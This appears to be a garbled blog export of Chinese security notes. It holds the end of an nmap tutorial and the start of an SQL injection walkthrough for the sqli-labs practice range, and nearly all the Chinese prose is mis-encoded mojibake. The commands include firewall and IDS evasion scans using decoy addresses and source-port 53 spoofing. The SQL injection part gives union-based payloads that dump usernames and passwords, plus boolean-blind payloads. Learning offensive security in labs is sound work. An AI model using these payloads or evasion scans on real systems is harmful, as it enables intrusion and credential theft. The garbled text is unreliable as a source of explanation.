ä»¥åç§°â€œhostâ€å¼€å¤´çš„æ‰€æœ‰æ ¼å¼å­˜å‚¨ç»“æœã€‚ -PE ä½¿ç”¨â€œICMP Echo è¯·æ±‚â€å¯¹ç›®æ ‡æ‰§è¡Œ ping æ‰«æã€‚ --reason æ˜¾ç¤ºç‰¹å®šç»“æœçš„åŸå› ã€‚ ä¸»æœºå’Œç«¯å£æ‰«æ åœ¨å‘ç°ç›®æ ‡è¿˜æ´»ç€ä¹‹åï¼Œæˆ‘ä»¬å¸Œæœ›æ›´å‡†ç¡®åœ°äº†è§£ç³»ç»Ÿã€‚æˆ‘ä»¬éœ€è¦çš„ä¿¡æ¯åŒ…æ‹¬ï¼š\nå¼€æ”¾ç«¯å£åŠå…¶æœåŠ¡ æœåŠ¡ç‰ˆæœ¬ æœåŠ¡æä¾›çš„ä¿¡æ¯ æ“ä½œç³»ç»Ÿ æ‰«æç«¯å£å…­ç§æƒ…å†µï¼š\nçŠ¶æ€ æè¿° open è¿™è¡¨ç¤ºå·²å»ºç«‹ä¸æ‰«æç«¯å£çš„è¿æ¥ã€‚è¿™äº›è¿æ¥å¯ä»¥æ˜¯TCP è¿æ¥ã€UDP æ•°æ®æŠ¥ä»¥åŠSCTP å…³è”ã€‚ closed å½“ç«¯å£æ˜¾ç¤ºä¸ºå…³é—­æ—¶ï¼ŒTCP åè®®ä¼šæŒ‡ç¤ºæˆ‘ä»¬æ”¶åˆ°çš„æ•°æ®åŒ…åŒ…å«ä¸€ä¸ªRSTæ ‡å¿—ã€‚è¿™ç§æ‰«ææ–¹æ³•è¿˜å¯ç”¨äºç¡®å®šæˆ‘ä»¬çš„ç›®æ ‡æ˜¯å¦è¿˜æ´»ç€ã€‚ filtered Nmap æ— æ³•æ­£ç¡®è¯†åˆ«æ‰«æçš„ç«¯å£æ˜¯æ‰“å¼€è¿˜æ˜¯å…³é—­ï¼Œå› ä¸ºç›®æ ‡æ²¡æœ‰è¿”å›è¯¥ç«¯å£çš„å“åº”ï¼Œæˆ–è€…æˆ‘ä»¬ä»ç›®æ ‡æ”¶åˆ°é”™è¯¯ä»£ç ã€‚ unfiltered ç«¯å£çš„è¿™ç§çŠ¶æ€ä»…åœ¨TCP-ACKæ‰«ææœŸé—´å‘ç”Ÿï¼Œè¡¨ç¤ºè¯¥ç«¯å£å¯è®¿é—®ï¼Œä½†æ— æ³•ç¡®å®šå®ƒæ˜¯å¼€æ”¾è¿˜æ˜¯å…³é—­ã€‚ `open filtered` `closed filtered` æ‰«æå‰ 10 ä¸ª TCP ç«¯å£ 1 sudo nmap 10.129.2.28 --top-ports=10 æ‰«æé€‰é¡¹ æè¿° 10.129.2.28 æ‰«ææŒ‡å®šç›®æ ‡ã€‚ --top-ports=10 æ‰«æå·²è¢«å®šä¹‰ä¸ºæœ€é¢‘ç¹çš„æŒ‡å®šé¡¶çº§ç«¯å£ã€‚ Nmapâ€”â€”è·Ÿè¸ªæ•°æ®åŒ… 1 sudo nmap 10.129.2.28 -p 21 --packet-trace -Pn -n --disable-arp-ping æ‰«æé€‰é¡¹ æè¿° 10.129.2.28 æ‰«ææŒ‡å®šç›®æ ‡ã€‚ -p 21 ä»…æ‰«ææŒ‡å®šç«¯å£ã€‚ --packet-trace æ˜¾ç¤ºæ‰€æœ‰å‘é€å’Œæ¥æ”¶çš„æ•°æ®åŒ…ã€‚ -n ç¦ç”¨ DNS è§£æã€‚ --disable-arp-ping ç¦ç”¨ ARP pingã€‚ ä¿¡æ¯ æè¿° SENT (0.0429s) è¡¨ç¤ºNmapçš„SENTæ“ä½œï¼Œå‘ç›®æ ‡å‘é€æ•°æ®åŒ…ã€‚ TCP æ˜¾ç¤ºç”¨äºä¸ç›®æ ‡ç«¯å£äº¤äº’çš„åè®®ã€‚ 10.10.14.2:63090 \u0026gt; ä»£è¡¨æˆ‘ä»¬çš„ IPv4 åœ°å€å’Œæºç«¯å£ï¼ŒNmap å°†ä½¿ç”¨å®ƒä»¬æ¥å‘é€æ•°æ®åŒ…ã€‚ 10.129.2.28:21 æ˜¾ç¤ºç›®æ ‡ IPv4 åœ°å€å’Œç›®æ ‡ç«¯å£ã€‚ S å‘é€çš„TCPæ•°æ®åŒ…çš„SYNæ ‡å¿—ã€‚ ttl=56 id=57322 iplen=44 seq=1699105818 win=1024 mss 1460 é™„åŠ çš„ TCP æ ‡å¤´å‚æ•°ã€‚ è¿æ¥æ‰«æ Nmap TCP è¿æ¥æ‰«æ( -sT) ä½¿ç”¨ TCP ä¸‰æ¬¡æ¡æ‰‹æ¥ç¡®å®šç›®æ ‡ä¸»æœºä¸Šçš„ç‰¹å®šç«¯å£æ˜¯æ‰“å¼€è¿˜æ˜¯å…³é—­ã€‚\n1 sudo nmap 10.129.2.28 -p 443 --packet-trace --disable-arp-ping -Pn -n --reason -sT è¯¥Connectæ‰«æï¼ˆä¹Ÿç§°ä¸ºå®Œæ•´ TCP è¿æ¥æ‰«æï¼‰éå¸¸å‡†ç¡®ï¼Œå› ä¸ºå®ƒå®Œæˆäº†ä¸‰æ¬¡ TCP æ¡æ‰‹ï¼Œä½¿æˆ‘ä»¬èƒ½å¤Ÿç¡®å®šç«¯å£çš„ç¡®åˆ‡çŠ¶æ€ï¼ˆæ‰“å¼€ã€å…³é—­æˆ–è¿‡æ»¤ï¼‰ã€‚ä½†æ˜¯ï¼Œå®ƒå¹¶ä¸æ˜¯æœ€éšè”½çš„ã€‚\nè¿‡æ»¤ç«¯å£ é˜²ç«å¢™dropsä¼šæ‰«ææˆ‘ä»¬å‘é€çš„ TCP æ•°æ®åŒ…ã€‚å› æ­¤ï¼Œæˆ‘ä»¬æ‰«æ TCP ç«¯å£139ï¼Œè¯¥ç«¯å£å·²æ˜¾ç¤ºä¸ºå·²è¿‡æ»¤ã€‚ä¸ºäº†èƒ½å¤Ÿè·Ÿè¸ªæˆ‘ä»¬å‘é€çš„æ•°æ®åŒ…çš„å¤„ç†æ–¹å¼ï¼Œæˆ‘ä»¬å†æ¬¡åœç”¨ ICMP å›æ˜¾è¯·æ±‚ ( -Pn)ã€DNS è§£æ ( -n) å’Œ ARP ping æ‰«æ ( --disable-arp-ping)ã€‚\n1 sudo nmap 10.129.2.28 -p 139 --packet-trace -n --disable-arp-ping -Pn å‘ç°å¼€æ”¾çš„ UDP ç«¯å£ 1 sudo nmap 10.129.2.28 -F -sU æ‰«æé€‰é¡¹ æè¿° 10.129.2.28 æ‰«ææŒ‡å®šç›®æ ‡ã€‚ -F æ‰«æå‰ 100 ä¸ªç«¯å£ã€‚ -sU æ‰§è¡Œ UDP æ‰«æã€‚ ä¸€äº›ç³»ç»Ÿç®¡ç†å‘˜æœ‰æ—¶ä¼šå¿˜è®°è¿‡æ»¤é™¤ TCP ç«¯å£ä¹‹å¤–çš„ UDP ç«¯å£ï¼Œä½†UDPæ¯”TCPæ…¢çš„å¤š\nè¿™æ ·åšçš„å¦ä¸€ä¸ªç¼ºç‚¹æ˜¯ï¼Œæˆ‘ä»¬ç»å¸¸å¾—ä¸åˆ°å“åº”ï¼Œå› ä¸ºNmapå‘æ‰«æçš„ UDP ç«¯å£å‘é€ç©ºæ•°æ®æŠ¥ï¼Œå¹¶ä¸”æˆ‘ä»¬æ²¡æœ‰æ”¶åˆ°ä»»ä½•å“åº”ã€‚æ‰€ä»¥æˆ‘ä»¬æ— æ³•ç¡®å®š UDP æ•°æ®åŒ…æ˜¯å¦å·²ç»åˆ°è¾¾ã€‚å¦‚æœ UDP ç«¯å£ä¸ºopenï¼Œåˆ™åªæœ‰åœ¨åº”ç”¨ç¨‹åºé…ç½®ä¸ºè¿™æ ·åšçš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ‰ä¼šæ”¶åˆ°å“åº”ã€‚\nç‰ˆæœ¬æ‰«æ 1 sudo nmap 10.129.2.28 -Pn -n --disable-arp-ping --packet-trace -p 445 --reason -sV æ‰«æé€‰é¡¹ æè¿° 10.129.2.28 æ‰«ææŒ‡å®šç›®æ ‡ã€‚ -Pn ç¦ç”¨ ICMP Echo è¯·æ±‚ã€‚ -n ç¦ç”¨ DNS è§£æã€‚ --disable-arp-ping ç¦ç”¨ ARP pingã€‚ --packet-trace æ˜¾ç¤ºæ‰€æœ‰å‘é€å’Œæ¥æ”¶çš„æ•°æ®åŒ…ã€‚ -p 445 ä»…æ‰«ææŒ‡å®šç«¯å£ã€‚ --reason æ˜¾ç¤ºç«¯å£å¤„äºç‰¹å®šçŠ¶æ€çš„åŸå› ã€‚ -sV æ‰§è¡ŒæœåŠ¡æ‰«æã€‚ æ‰«æç«¯å£çš„å¦ä¸€ç§æ–¹ä¾¿æ–¹æ³•æ˜¯-sVä½¿ç”¨é€‰é¡¹ä»å¼€æ”¾ç«¯å£è·å–å…¶ä»–å¯ç”¨ä¿¡æ¯ã€‚æ­¤æ–¹æ³•å¯ä»¥è¯†åˆ«ç‰ˆæœ¬ã€æœåŠ¡åç§°å’Œæœ‰å…³ç›®æ ‡çš„è¯¦ç»†ä¿¡æ¯ã€‚\nä¿å­˜ç»“æœ Nmapå¯ä»¥ä»¥ 3 ç§ä¸åŒçš„æ ¼å¼ä¿å­˜ç»“æœã€‚\næ­£å¸¸è¾“å‡ºï¼ˆ-oNï¼‰.nmapæ–‡ä»¶æ‰©å±•å å¸¦æœ‰æ–‡ä»¶æ‰©å±•åçš„Grepable è¾“å‡ºï¼ˆ-oGï¼‰.gnmap XML è¾“å‡º ( -oX)ï¼Œ.xmlæ–‡ä»¶æ‰©å±•å æˆ‘ä»¬è¿˜å¯ä»¥æŒ‡å®šé€‰é¡¹ï¼ˆ-oAï¼‰ä»¥æ‰€æœ‰æ ¼å¼ä¿å­˜ç»“æœã€‚å‘½ä»¤å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š\n1 sudo nmap 10.129.2.28 -p- -oA target æ‰«æé€‰é¡¹ æè¿° 10.129.2.28 æ‰«ææŒ‡å®šç›®æ ‡ã€‚ -p- æ‰«ææ‰€æœ‰ç«¯å£ã€‚ -oA target ä»¥æ‰€æœ‰æ ¼å¼ä¿å­˜ç»“æœï¼Œæ¯ä¸ªæ–‡ä»¶çš„åç§°ä»¥â€œç›®æ ‡â€å¼€å¤´ã€‚ 1 target.gnmap target.xml target.nmap è½¬æ¢æ ¼å¼ è¦å°†å­˜å‚¨çš„ç»“æœä» XML æ ¼å¼è½¬æ¢ä¸º HTMLï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¯¥å·¥å…·xsltprocã€‚\n1 xsltproc target.xml -o target.html æœåŠ¡æšä¸¾ æœåŠ¡ç‰ˆæœ¬æ£€æµ‹ 1 sudo nmap 10.129.2.28 -p- -sV æé€‰é¡¹ æè¿° 10.129.2.28 æ‰«ææŒ‡å®šç›®æ ‡ã€‚ -p- æ‰«ææ‰€æœ‰ç«¯å£ã€‚ -sV å¯¹æŒ‡å®šç«¯å£æ‰§è¡ŒæœåŠ¡ç‰ˆæœ¬æ£€æµ‹ã€‚ å¢åŠ verbosity levelï¼ˆ-v/ -vvï¼‰ï¼Œå½“æ£€æµ‹åˆ°å¼€æ”¾ç«¯å£æ—¶ï¼Œå®ƒå°†ç›´æ¥æ˜¾ç¤ºç»™æˆ‘ä»¬Nmap\n1 sudo nmap 10.129.2.28 -p- -sV -v æ‰«æé€‰é¡¹ æè¿° 10.129.2.28 æ‰«ææŒ‡å®šç›®æ ‡ã€‚ -p- æ‰«ææ‰€æœ‰ç«¯å£ã€‚ -sV å¯¹æŒ‡å®šç«¯å£æ‰§è¡ŒæœåŠ¡ç‰ˆæœ¬æ£€æµ‹ã€‚ -v å¢åŠ æ‰«æçš„è¯¦ç»†ç¨‹åº¦ï¼Œä»¥æ˜¾ç¤ºæ›´è¯¦ç»†çš„ä¿¡æ¯ã€‚ æ¨ªå¹…æŠ“å– Nmapåˆ™å°è¯•é€šè¿‡åŸºäºç­¾åçš„åŒ¹é…ç³»ç»Ÿè¯†åˆ«å®ƒä»¬ï¼Œä½†è¿™ä¼šå¤§å¤§å¢åŠ æ‰«æçš„æŒç»­æ—¶é—´ã€‚Nmapæ‰€å‘ˆç°ç»“æœçš„ä¸€ä¸ªç¼ºç‚¹æ˜¯è‡ªåŠ¨æ‰«æå¯èƒ½ä¼šé—æ¼ä¸€äº›ä¿¡æ¯ï¼Œå› ä¸ºæœ‰æ—¶Nmapä¸çŸ¥é“å¦‚ä½•å¤„ç†å®ƒã€‚\næŸäº›æœåŠ¡å¯èƒ½ä¸ä¼šç«‹å³æä¾›æ­¤ç±»ä¿¡æ¯ã€‚ä¹Ÿå¯ä»¥ä»ç›¸åº”çš„æœåŠ¡ä¸­åˆ é™¤æˆ–æ“çºµæ¨ªå¹…ã€‚å¦‚æœæˆ‘ä»¬manuallyä½¿ç”¨ è¿æ¥åˆ° SMTP æœåŠ¡å™¨ncï¼ŒæŠ“å–æ¨ªå¹…ï¼Œå¹¶ä½¿ç”¨ æ‹¦æˆªç½‘ç»œæµé‡tcpdumpï¼Œæˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°Nmapæœªæ˜¾ç¤ºçš„å†…å®¹ã€‚\nä¼ è¾“æ§åˆ¶åŒ…Tcpdump 1 sudo tcpdump -i eth0 host 10.10.14.2 and 10.129.2.28 nc 1 nc -nv 10.129.2.28 25 Nmapè„šæœ¬å¼•æ“ å®ƒä¸ºæˆ‘ä»¬æä¾›äº†åœ¨ Lua ä¸­åˆ›å»ºè„šæœ¬ä»¥ä¸æŸäº›æœåŠ¡è¿›è¡Œäº¤äº’çš„å¯èƒ½æ€§ã€‚è¿™äº›è„šæœ¬æ€»å…±å¯åˆ†ä¸º 14 ä¸ªç±»åˆ«ï¼š\nç±»åˆ« æè¿° auth ç¡®å®šèº«ä»½éªŒè¯å‡­è¯ã€‚ broadcast é€šè¿‡å¹¿æ’­æ¥å‘ç°ä¸»æœºçš„è„šæœ¬ä»¥åŠå‘ç°çš„ä¸»æœºå¯ä»¥è‡ªåŠ¨æ·»åŠ åˆ°å‰©ä½™çš„æ‰«æä¸­ã€‚ brute æ‰§è¡Œè„šæœ¬ï¼Œå°è¯•é€šè¿‡ä½¿ç”¨å‡­è¯è¿›è¡Œæš´åŠ›ç ´è§£æ¥ç™»å½•ç›¸åº”çš„æœåŠ¡ã€‚ default ä½¿ç”¨è¯¥-sCé€‰é¡¹æ‰§è¡Œçš„é»˜è®¤è„šæœ¬ã€‚ discovery æ— éšœç¢æœåŠ¡çš„è¯„ä¼°ã€‚ dos è¿™äº›è„šæœ¬ç”¨äºæ£€æŸ¥æœåŠ¡æ˜¯å¦å­˜åœ¨æ‹’ç»æœåŠ¡æ¼æ´ï¼Œç”±äºå®ƒä¼šæŸå®³æœåŠ¡ï¼Œå› æ­¤ä½¿ç”¨è¾ƒå°‘ã€‚ exploit æ­¤ç±»è„šæœ¬å°è¯•åˆ©ç”¨æ‰«æç«¯å£çš„å·²çŸ¥æ¼æ´ã€‚ external ä½¿ç”¨å¤–éƒ¨æœåŠ¡è¿›è¡Œè¿›ä¸€æ­¥å¤„ç†çš„è„šæœ¬ã€‚ fuzzer è¿™ä½¿ç”¨è„šæœ¬é€šè¿‡å‘é€ä¸åŒçš„å­—æ®µæ¥è¯†åˆ«æ¼æ´å’Œæ„å¤–çš„æ•°æ®åŒ…å¤„ç†ï¼Œè¿™å¯èƒ½éœ€è¦å¾ˆé•¿æ—¶é—´ã€‚ intrusive å¯èƒ½å¯¹ç›®æ ‡ç³»ç»Ÿäº§ç”Ÿè´Ÿé¢å½±å“çš„ä¾µå…¥æ€§è„šæœ¬ã€‚ malware æ£€æŸ¥æŸäº›æ¶æ„è½¯ä»¶æ˜¯å¦æ„ŸæŸ“äº†ç›®æ ‡ç³»ç»Ÿã€‚ safe ä¸æ‰§è¡Œä¾µå…¥æ€§å’Œç ´åæ€§è®¿é—®çš„é˜²å¾¡è„šæœ¬ã€‚ version æœåŠ¡æ£€æµ‹çš„æ‰©å±•ã€‚ vuln è¯†åˆ«ç‰¹å®šçš„æ¼æ´ã€‚ é»˜è®¤è„šæœ¬ -sC\nç‰¹å®šè„šæœ¬ç±»å‹\u0026ndash;script å®šä¹‰è„šæœ¬ \u0026ndash;script ,\nNmap - Aggressive Scan -A 1 sudo nmap 10.129.2.28 -p 80 -A -A æ‰§è¡ŒæœåŠ¡æ£€æµ‹ã€æ“ä½œç³»ç»Ÿæ£€æµ‹ã€è·Ÿè¸ªè·¯ç”±å¹¶ä½¿ç”¨é»˜è®¤è„šæœ¬æ‰«æç›®æ ‡ã€‚ å‘ç°äº†ç³»ç»Ÿä¸Šè¿è¡Œç€å“ªç§ Web æœåŠ¡å™¨,ä½¿ç”¨äº†å“ªç§ Web åº”ç”¨ç¨‹åºï¼Œä»¥åŠç½‘é¡µçš„æ ‡é¢˜ ã€‚ æ¼æ´è¯„ä¼° --script vuln ä½¿ç”¨æŒ‡å®šç±»åˆ«çš„æ‰€æœ‰ç›¸å…³è„šæœ¬ã€‚ é˜²ç«å¢™å’ŒIDS/IPSè§„é¿ TCP SYNæ‰«æåˆç§°â€œåŠå¼€æ‰«æâ€ã€‚å›é¡¾TCPè¿æ¥çš„ä¸‰æ¬¡æ¡æ‰‹ï¼Œç”³è¯·æ–¹é¦–å…ˆå‘é€çš„æ˜¯ä¸€ä¸ªSYNæ•°æ®åŒ…ï¼ŒæœåŠ¡æ–¹åœ¨æ¥åˆ°è¿™ä¸ªSYNæ•°æ®åŒ…åï¼Œå¦‚æœè¯¥ç«¯å£å¤„äºä¾¦å¬çŠ¶æ€ï¼Œåˆ™ä¼šå›å¤ä¸€ä¸ªSYN|ACKçš„æ•°æ®åŒ…ï¼›å¦‚æœè¯¥ç«¯å£æ²¡æœ‰å¤„äºä¾¦å¬çŠ¶æ€ï¼Œåˆ™ä¼šå›å¤ä¸€ä¸ªRSTçš„æ•°æ®åŒ…ã€‚è€Œæ­¤æ—¶å¦‚æœå¯¹æ–¹å¤„äºä¾¦å¬çŠ¶æ€ï¼Œç”³è¯·æ–¹è¿˜éœ€è¦å†å‘å¯¹æ–¹å›å¤ä¸€ä¸ªACKæ•°æ®åŒ…ä»¥ç¤ºå»ºç«‹è¿æ¥ã€‚æ­¤æ—¶å¯¹æ–¹å°±è®¤ä¸ºè¿æ¥å»ºç«‹ï¼Œå¹¶è®°å…¥æ—¥å¿—ã€‚\næ— è®ºæœåŠ¡æ–¹å›å¤SYN|ACKçš„æ•°æ®åŒ…ï¼Œè¿˜æ˜¯å›å¤RSTçš„æ•°æ®åŒ…ï¼Œç”³è¯·æ–¹å…¶å®å·²ç»èƒ½å¤Ÿåˆ¤æ–­å¯¹æ–¹ç«¯å£æ˜¯å¦ä¸ºâ€œå¼€â€çš„çŠ¶æ€ã€‚ä¹‹åçš„ACKæ•°æ®åŒ…å‘é€åˆ™è¢«å¯¹æ–¹ç›‘è§†ï¼Œå¦‚æœæ­¤æ—¶ä¸å‘é€ACKæ•°æ®åŒ…ï¼Œè€Œæ˜¯å‘ä¸€ä¸ªRSTæ•°æ®åŒ…ï¼Œåˆ™ä¸ä»…å…³é—­äº†è¿™ä¸ªæœªå®Œæˆçš„è¿æ¥è¿‡ç¨‹ï¼Œå¹¶ä¸”ä¹Ÿä¼šå› ä¸ºè¿æ¥æœªå»ºç«‹è€Œä¸ä¼šè¢«å¯¹æ–¹è®°å½•ã€‚è¿™ç§æ‰«ææ–¹å¼å› ä¸ºä½¿ç”¨äº†SYNæ ‡å¿—ä½ï¼Œæ‰€ä»¥è¢«ç§°ä¸ºTCP SYNæ‰«æã€‚è¿™ç§æ‰«ææŠ€æœ¯çš„ä¼˜ç‚¹åœ¨äºä¸€èˆ¬ä¸ä¼šåœ¨ç›®æ ‡è®¡ç®—æœºä¸Šç•™ä¸‹è®°å½•ï¼Œæœ‰æ—¶å³ä½¿åœ¨ç”¨netstatå‘½ä»¤ä¹Ÿæ˜¾ç¤ºä¸å‡ºæ¥ï¼›ä½†è¿™ç§æ–¹æ³•çš„ä¸€ä¸ªç¼ºç‚¹æ˜¯å¿…é¡»è¦æœ‰ç®¡ç†å‘˜æƒé™æ‰èƒ½å»ºç«‹è‡ªå·±çš„SYNæ•°æ®åŒ…ã€‚\nä½¿ç”¨è¯±é¥µæ‰«æ Nmap ä¼šç”Ÿæˆæ’å…¥åˆ° IP æ ‡å¤´ä¸­çš„å„ç§éšæœº IP åœ°å€ï¼Œä»¥æ©ç›–å‘é€çš„æ•°æ®åŒ…çš„æ¥æºã€‚ä½¿ç”¨æ­¤æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥éšæœºç”Ÿæˆ ( RND) ä¸ªç‰¹å®šæ•°é‡ï¼ˆä¾‹å¦‚ï¼š5ï¼‰çš„ IP åœ°å€ï¼Œå¹¶ä»¥å†’å· ( :) åˆ†éš”ã€‚ç„¶åï¼Œæˆ‘ä»¬çš„çœŸå® IP åœ°å€ä¼šéšæœºæ”¾ç½®åœ¨ç”Ÿæˆçš„ IP åœ°å€ä¹‹é—´\n1 sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5 æ‰«æé€‰é¡¹ æè¿° 10.129.2.28 æ‰«ææŒ‡å®šç›®æ ‡ã€‚ -p 80 ä»…æ‰«ææŒ‡å®šç«¯å£ã€‚ -sS å¯¹æŒ‡å®šç«¯å£æ‰§è¡Œ SYN æ‰«æã€‚ -Pn ç¦ç”¨ ICMP Echo è¯·æ±‚ã€‚ -n ç¦ç”¨ DNS è§£æã€‚ --disable-arp-ping ç¦ç”¨ ARP pingã€‚ --packet-trace æ˜¾ç¤ºæ‰€æœ‰å‘é€å’Œæ¥æ”¶çš„æ•°æ®åŒ…ã€‚ -D RND:5 ç”Ÿæˆäº”ä¸ªéšæœº IP åœ°å€ï¼ŒæŒ‡ç¤ºè¿æ¥æ¥è‡ªçš„æº IPã€‚ DNS ä»£ç† è¿‡æ»¤ç«¯å£çš„ SYN æ‰«æ 1 sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace ä» DNS ç«¯å£è¿›è¡Œ SYN æ‰«æ 1 sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53 ç°åœ¨æˆ‘ä»¬å·²ç»å‘ç°é˜²ç«å¢™æ¥å—äº†TCP port 53ï¼Œå› æ­¤å¾ˆå¯èƒ½ IDS/IPS è¿‡æ»¤å™¨çš„é…ç½®ä¹Ÿæ¯”å…¶ä»–è¿‡æ»¤å™¨å¼±å¾—å¤šã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨ å°è¯•è¿æ¥åˆ°æ­¤ç«¯å£æ¥æµ‹è¯•è¿™ä¸€ç‚¹Netcatã€‚\næ‰«æé€‰é¡¹ æè¿° 10.129.2.28 æ‰«ææŒ‡å®šç›®æ ‡ã€‚ -p 50000 ä»…æ‰«ææŒ‡å®šç«¯å£ã€‚ -sS å¯¹æŒ‡å®šç«¯å£æ‰§è¡Œ SYN æ‰«æã€‚ -Pn ç¦ç”¨ ICMP Echo è¯·æ±‚ã€‚ -n ç¦ç”¨ DNS è§£æã€‚ --disable-arp-ping ç¦ç”¨ ARP pingã€‚ --packet-trace æ˜¾ç¤ºæ‰€æœ‰å‘é€å’Œæ¥æ”¶çš„æ•°æ®åŒ…ã€‚ --source-port 53 ä»æŒ‡å®šçš„æºç«¯å£æ‰§è¡Œæ‰«æã€‚ è¿æ¥åˆ°è¿‡æ»¤ç«¯å£ 1 ncat -nv --source-port 53 10.129.2.28 50000 ","date":"2025-01-12T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/nmap%E5%9F%BA%E7%A1%80/","title":"nmapåŸºç¡€"},{"content":" å·¥å…·ï¼šphpstudyï¼ŒHackbar æ­å»ºé¶åœºï¼šsqli-labs(ä»Githubä¸Šä¸‹è½½å®˜æ–¹çš„ï¼Œæœ‰äº›æ°‘é—´çš„å¯èƒ½ä¼šæœ‰æœ¨é©¬) æ•°æ®åº“ï¼šmysql5.7 è”åˆæ³¨å…¥ éœ€è¦é¡µé¢æœ‰å›æ˜¾ä½\næŸ¥æ‰¾æ³¨å…¥ç‚¹\nåˆ¤æ–­ä½¿å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹æ³¨å…¥id=2-1\nå¦‚æœæ˜¯å­—ç¬¦å‹ï¼Œæ‰¾åˆ°é—­åˆæ–¹å¼ï¼Œâ€˜ï¼Œâ€œï¼Œâ€™)\nåˆ¤æ–­æŸ¥è¯¢åˆ—æ•°ï¼Œorder by\næŸ¥è¯¢å›æ˜¾ä½ç½®ï¼ŒåŒæ—¶å°†åŸå…ˆçš„æŸ¥è¯¢idæ³¨é‡Šæ‰\næ‹¿åˆ°è¡¨åå’Œåˆ—åï¼šæ•°æ®åº“ï¼ˆinformation_schemaï¼‰ï¼Œè¡¨åé›†åˆè¡¨ï¼ˆtablesï¼‰ï¼Œåˆ—åé›†åˆè¡¨ï¼ˆcolumnsï¼‰ç”¨group_concat()ç¡®ä¿æ‰€æœ‰æŸ¥è¯¢ä¿¡æ¯èƒ½æ”¾åˆ°ä¸€è¡Œæ˜¾ç¤ºå‡ºæ¥\nless-1 åˆ¤æ–­æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥\n\u0026ndash;+è¡¨ç¤ºå¯¹å¤šä½™çš„å¼•å·è¿›è¡Œæ³¨é‡Šï¼Œå› ä¸ºæ˜¯å­—ç¬¦å‹ï¼Œæ•°å­—å‹å°±ä¸ç”¨ç®¡\n1 ?id=1\u0026#39; order by 3--+ æ˜¾ç¤ºæ­£å¸¸\n1 ?id=1\u0026#39; order by 4--+ æŠ¥é”™\nå¾—çŸ¥less-1å…±æœ‰ä¸‰åˆ—ï¼Œçˆ†å‡ºæ˜¾ç¤ºä½\n1 ?id=1\u0026#39; union select 1,2,3--+ åœ¨mysqlé‡Œé¢å°è¯•union select\n1 ?id=-1\u0026#39; union select 1,2,3--+ ä½¿id=-1æŠ¥é”™æ³¨é‡Šï¼Œé¡µé¢æ˜¾ç¤ºæ­£å¸¸\nè·å–æ•°æ®å\n1 ?id=-1\u0026#39; union select 1,database(),version() --+ ä¸­é—´çœç•¥äº†ä¸€äº›è¿‡ç¨‹è¯¦è§less-2\næŸ¥è¯¢ç”¨æˆ·åå’Œå¯†ç \n1 ?id=-1\u0026#39; union select 1,group_concat(username,\u0026#39;~\u0026#39;,password),3 from users--+ less-2 åˆ¤æ–­ä¸ºæ•°å­—å‹ï¼Œé¡µé¢æ”¹å˜\n1 ?id=2-1 ï¼Ÿid=2 ä¸‰åˆ—\n1 ?id=1 order by 3 é—­åˆæ–¹å¼ä¸ºâ€˜\n1 ?id=1\u0026#39; order by 3 çˆ†æ•°æ®å\n1 ï¼Ÿid=-1 union select 1,database(),version() çˆ†è¡¨å\n1 ?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39; çˆ†åˆ—å\n1 ?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=\u0026#39;security\u0026#39; less-3 ä¸å‰ä¸¤å…³ä¸åŒçš„åœ°æ–¹æ˜¯é—­åˆæ–¹å¼\n1 ?id=1\u0026#39; å•å¼•å·åŠ æ‹¬å·ï¼Œåç»­ä¸€å¾‹ä»¥?id=1\u0026rsquo;)å¼€å¤´ï¼Œå’Œä¸Šé¢åŒ\nless-4 åˆ¤æ–­å¾—çŸ¥é—­åˆæ–¹å¼åŒå¼•å·åŠ æ‹¬å·\n1 /?id=2\u0026#34; å¸ƒå°”ç›²æ³¨ é¡µé¢æ²¡æœ‰å›æ˜¾ï¼Œåªé€‚ç”¨äºMysqlï¼Œæœ¬è´¨å°±æ˜¯çŒœæ•°å­—æ¸¸æˆï¼ŒASCIIç åˆ¤æ–­ç”¨äºŒåˆ†æ³•ï¼Œå¯¹äºå­—ç¬¦é•¿åº¦åˆ¤æ–­å¯ä»¥ç›´æ¥çŒœå¤§å°\nåˆ¤æ–­å¾—çŸ¥é—­åˆæ–¹å¼ä¸º'\näºŒåˆ†æ³•åˆ¤æ–­æ•°æ®åº“é•¿åº¦ 1 2 3 4 ?id=1\u0026#39; and length(database())\u0026gt;10--+ //ä¸æ˜¾ç¤º ?id=1\u0026#39; and length(database())\u0026gt;5--+ //æ­£å¸¸æ˜¾ç¤º ?id=1\u0026#39; and length(database())\u0026gt;7--+ //æ­£å¸¸æ˜¾ç¤º ?id=1\u0026#39; and length(database())\u0026gt;8--+ //ä¸æ˜¾ç¤º å¾—çŸ¥databaseï¼ˆï¼‰é•¿åº¦ä¸º8\näºŒåˆ†æ³•åˆ©ç”¨ASCIIç åˆ¤æ–­å­—ç¬¦ 1 2 3 4 ?id=1\u0026#39; and ascii(substr(database(),1,1))\u0026gt;100--+ //æ­£å¸¸æ˜¾ç¤º ?id=1\u0026#39; and ascii(substr(database(),1,1))\u0026gt;114--+ //æ­£å¸¸æ˜¾ç¤º ?id=1\u0026#39; and ascii(substr(database(),1,1))\u0026gt;120--+ //ä¸æ˜¾ç¤º ?id=1\u0026#39; and ascii(substr(database(),1,1))\u0026gt;115--+ //ä¸æ˜¾ç¤º å¾—çŸ¥ç¬¬ä¸€ä¸ªå­—ç¬¦ASCIIç ä¸º115ï¼Œå³â€œsâ€\nä¾æ¬¡åˆ¤æ–­8ä¸ªå­—ç¬¦ï¼ŒçŸ¥å½“å‰æ•°æ®åº“ä¸ºsecurity\nåˆ¤æ–­å½“å‰æ•°æ®åº“çš„è¡¨ åˆ¤æ–­æ˜¯å¦å­˜åœ¨adminè¡¨\n1 ?id=1\u0026#39; and exists(select * from admin)--+ 